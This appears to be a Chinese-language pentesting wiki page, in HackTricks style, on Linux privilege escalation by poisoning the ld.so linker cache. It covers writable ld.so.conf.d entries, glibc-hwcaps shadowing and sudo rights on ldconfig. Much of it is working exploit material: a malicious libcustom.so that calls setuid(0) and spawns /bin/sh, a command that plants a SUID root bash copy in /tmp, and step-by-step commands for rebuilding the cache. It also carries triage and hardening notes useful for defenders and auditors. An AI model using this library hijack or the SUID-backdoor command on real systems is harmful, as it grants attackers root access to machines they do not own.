# ld.so privesc exploit example

此页面是一个专门用于演示如何通过 `/etc/ld.so.conf` 或 `ldconfig` 污染 **system linker cache** 的实验环境。对于缺失 library 注入、可写的 `RPATH`/`RUNPATH`、`LD_PRELOAD` 以及其他通用的 SUID linker abuse，请参阅 [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md)。

## 准备环境

在以下部分中，你可以找到我们将用于准备环境的文件代码

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. 在你的机器上同一文件夹中**创建**这些文件
2. **编译** **library**：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. 将 `libcustom.so` **复制**到 `/usr/lib` 并刷新缓存：`sudo cp libcustom.so /usr/lib && sudo ldconfig`（需要 root privs）
4. **编译** **executable**：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

确认 _libcustom.so_ 是从 _/usr/lib_ **加载**的，并且可以**执行**该 binary。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 有用的 triage 命令

攻击真实目标时，请验证 binary 所需的**确切 library 名称**、loader **当前正在解析的内容**，以及哪些已配置路径可写，同时不要修改 live cache。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
仅对**可信**的可执行文件使用 `ldd`。某些实现或异常的 ELF 解释器可能导致其执行攻击者控制的代码；`objdump -p ./file | grep NEEDED` 可以安全地列出直接依赖项。对于可信目标，使用发现的解释器调用 `--list` 可以显示实际的解析结果。<sup>[[4]](#references)</sup>

一些有用的注意事项：

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` 通常**不起作用**，因为重定向由当前 shell 执行。请改用
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`。
- **SUID/privileged** 二进制文件会以 **secure-execution mode** 运行：`LD_LIBRARY_PATH`
会被忽略，而 `LD_PRELOAD` 受到限制（包含斜杠的名称会被忽略，只有标准目录中带有 setuid 标记的库才可以被 preload）。root 运行 `ldconfig` 后，`/etc/ld.so.conf` 中列出的目录可以进入 `/etc/ld.so.cache`，因此这种错误配置仍可能影响 privileged 程序。<sup>[[1]](#references)[[2]](#references)</sup>
- 在 secure-execution mode 下，`LD_DEBUG` 同样会被忽略，除非存在 `/etc/suid-debug`；因此应从等效的非 SUID 运行中收集其 trace，而不要期待 privileged execution 输出结果。<sup>[[1]](#references)</sup>
- 在 glibc 2.33 及更高版本中，dynamic loader 还提供了
`--list-diagnostics`，当 hijack 行为不符合预期时，该选项会输出机器可读的 loader diagnostics 和内置 search-path 信息。<sup>[[1]](#references)[[6]](#references)</sup>

### Cache 和 SONAME 约束

`ldconfig` 不会缓存配置目录中的每个任意文件：它会检查 ELF headers，识别名称匹配 `lib*.so*` 或 `ld-*.so*` 的文件，并要求遵循常规的 `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` 链。注入的对象因此必须具有目标 architecture/class、精确的 `DT_NEEDED` 名称（通常是其 `DT_SONAME`），以及 victim 解析的所有 symbols/versions。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
优先使用特定于目标的 library，例如此示例。使用不完整的 object shadowing 常见 SONAME，可能会破坏每个在预期的 privileged target 运行前解析该 SONAME 的进程。<sup>[[3]](#references)</sup>

## Exploit

在此场景中，假设管理员已将一个 vulnerable entry 添加到
`/etc/ld.so.conf.d/` 下的某个 file 中，而系统的
`/etc/ld.so.conf` 会包含该 file。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
易受攻击的文件夹是 _/home/ubuntu/lib_（我们拥有可写访问权限）。\
**在该路径中下载并编译**以下代码：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
如果你预计 **root**（或其他特权账户）稍后会执行这个存在漏洞的二进制文件，通常最好留下一个 **root-owned artifact**，而不是生成交互式 shell。例如：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
然后，在特权执行发生后，你可以使用 `/tmp/rootbash -p`。

现在，我们已经在配置错误的路径中**创建了恶意的 libcustom 库**，默认缓存必须通过一次成功的特权 **`ldconfig`** 运行来重建。只有在本地启动过程确实会调用它的情况下，重启才会有所帮助；否则，请等待管理员操作，或在可用时使用不安全的 sudo 规则。<sup>[[2]](#references)</sup>

完成此操作后，**重新检查** `sharedvuln` 可执行文件从何处加载 `libcustom.so` 库：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
正如你所见，它是从 **`/home/ubuntu/lib`** 加载的，如果任何用户执行它，就会启动一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 请注意，在此示例中我们尚未提升权限，但通过修改所执行的命令，并**等待 root 或其他特权用户执行存在漏洞的二进制文件**，我们将能够提升权限。

### Modern `glibc-hwcaps` shadowing

自 glibc 2.33 起，loader 可以优先使用**每个库搜索目录**中 `glibc-hwcaps/<level>/` 下的优化库。因此，仅检查 `/home/ubuntu/lib` 是不够的：可写的兼容子目录，例如 `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`，在 `ldconfig` 将其编入索引后可以 shadow 基础库，而其他 CPU 仍会使用基础对象。这还提供了一种架构选择性 hijack，在不同 CPU 上进行验证时可能会被遗漏。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
当前的 glibc hardening 指南建议避免重复的 SONAME、非默认搜索位置，以及 `glibc-hwcaps` 子目录中的对象。从审计角度来看，应递归检查已配置目录及其父路径组件的所有权和可写权限。<sup>[[3]](#references)</sup>

### 其他配置错误 - 同一漏洞

在前面的示例中，我们伪造了一个配置错误：管理员**在 `/etc/ld.so.conf.d/` 中的配置文件内设置了一个非特权目录**。\
但还有其他配置错误也可能导致同一漏洞：如果你对已加载的**配置文件**拥有**写权限**，可以在可写的 `/etc/ld.so.conf.d/` 目录中创建文件，或者可以写入 `/etc/ld.so.conf`，那么你就可以配置并利用同一漏洞。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**假设你对 `ldconfig` 拥有 sudo 权限**。\
你可以使用 `-f` 指定 `ldconfig` **要读取的配置文件**，因此，一个包含攻击者可控目录的文件可以使 `ldconfig` 将这些目录添加到缓存中。<sup>[[2]](#references)</sup>\
那么，让我们创建加载 `"/tmp"` 所需的文件和目录：
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，如 **previous exploit** 中所示，在 `/tmp` 内创建恶意 library。\
最后，让我们加载该路径，并检查 binary 从何处加载 library：
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**如你所见，拥有针对 `ldconfig` 的 sudo 权限，同样可以利用这一漏洞。** 在评估受限 sudo 规则时，选项的具体行为很重要：`-f` 选择其他配置文件，但仍会重建 `/etc/ld.so.cache`；`-C` 将 cache 重定向到其他位置；`-N` 禁止重建 cache；而 `-X` 禁止更新 link，但**除非与 `-N` 组合使用，否则仍会重建 cache**。<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux 手册页](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf（GNU Binary Utilities）](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics（GNU C Library）](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
